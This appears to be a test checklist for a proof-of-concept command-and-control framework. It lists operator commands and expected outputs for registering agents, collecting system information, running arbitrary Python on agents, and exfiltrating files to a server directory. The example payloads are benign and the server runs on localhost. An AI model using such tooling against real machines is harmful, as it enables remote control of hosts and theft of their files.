C2 Sample Operator Commands (POC)

Assumptions
	•	Server running:
python3 -m server.app
	•	Agent running:
python3 -m agent.agent
	•	Replace <AGENT_ID> with the value from:
python3 -m controller.operator agents


0. GUI Task Dispatch (Dashboard)

Open https://localhost:5000 in your browser.

1. Select an agent from the sidebar (green dot = online)
2. In Task Dispatch, choose:
   - Agent:     <agent from dropdown>
   - Task Type: list_directory
   - path:      /tmp
3. Click Push Task

Expected: task appears in the Task Queue with status queued → completed


⸻

1. List Registered Agents

python3 -m controller.operator agents


⸻

2. Get System Information

python3 -m controller.operator exec <AGENT_ID> get_sysinfo


⸻

3. List Directory Contents

python3 -m controller.operator exec <AGENT_ID> list_directory --args '{"path":"."}'


⸻

4. Execute Simple Python Code

python3 -m controller.operator exec <AGENT_ID> python_exec --args '{"code":"result = 2 + 2"}'

Expected result:

{"status": "success", "result": 4}


⸻

5. Python Execution Timeout Test

python3 -m controller.operator exec <AGENT_ID> python_exec --args '{"code":"while True: pass"}'

Expected:
	•	Execution timeout (~5 seconds)
	•	Agent continues beaconing

⸻

6. Exfiltrate a File

python3 -m controller.operator exec <AGENT_ID> exfil_file --args '{"path":"README.md"}'

Expected:
	•	File saved in server/exfil/
	•	5MB max file size enforced

⸻

7. Invalid Task Type (Error Handling Test)

python3 -m controller.operator exec <AGENT_ID> does_not_exist

Expected:

{"status": "error", "message": "Unknown task type"}


⸻

8. Fake Agent Test (404)

python3 -m controller.operator exec fake-agent-id get_sysinfo

Expected:

Error: {'error': 'Unknown agent'}


⸻

System Limits
	•	Max queued tasks per agent: 100
	•	Max exfil file size: 5MB
	•	Exfil storage directory: server/exfil/
	•	Transport encryption: Fernet
	•	Task execution: Multiprocessing sandbox (5-second default timeout)